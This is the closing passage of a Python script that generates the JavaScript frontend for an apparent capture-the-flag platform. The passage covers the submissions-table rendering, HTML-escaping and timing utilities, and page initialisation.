        <td><span class="cat-badge" style="font-size:10px;">${{escapeHtml(s.challenge_category || 'general')}}</span></td>
        <td class="mono" style="font-size:12px; color:var(--paper-dim)">${{escapeHtml(flagMask)}}</td>
        <td>
          <span class="sub-badge ${{s.correct ? 'sub-correct' : 'sub-incorrect'}}">
            ${{s.correct ? '✓ SOLVED' : '✗ INCORRECT'}}
          </span>
        </td>
      </tr>
    `;
  }}).join('');

  host.innerHTML = `
    <table class="board-table sub-table">
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>Challenge</th>
          <th>Category</th>
          <th>Flag</th>
          <th>Result</th>
        </tr>
      </thead>
      <tbody>${{rows}}</tbody>
    </table>
  `;
}}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

function escapeHtml(str) {{
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}}

function debounce(fn, wait) {{
  let t;
  return (...args) => {{
    clearTimeout(t);
    t = setTimeout(() => fn(...args), wait);
  }};
}}

function sleep(ms) {{
  return new Promise(resolve => setTimeout(resolve, ms));
}}

function prefersReducedMotion() {{
  return window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
}}

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

async function init() {{
  // Boot directly to show challenges immediately!
  await bootApp();
}}

document.addEventListener('DOMContentLoaded', init);
'''

target_file = FRONTEND_DIR / "app.js"
target_file.write_text(app_js_content, encoding="utf-8")
print(f"Successfully generated {target_file} with {len(challenges)} embedded challenges!")
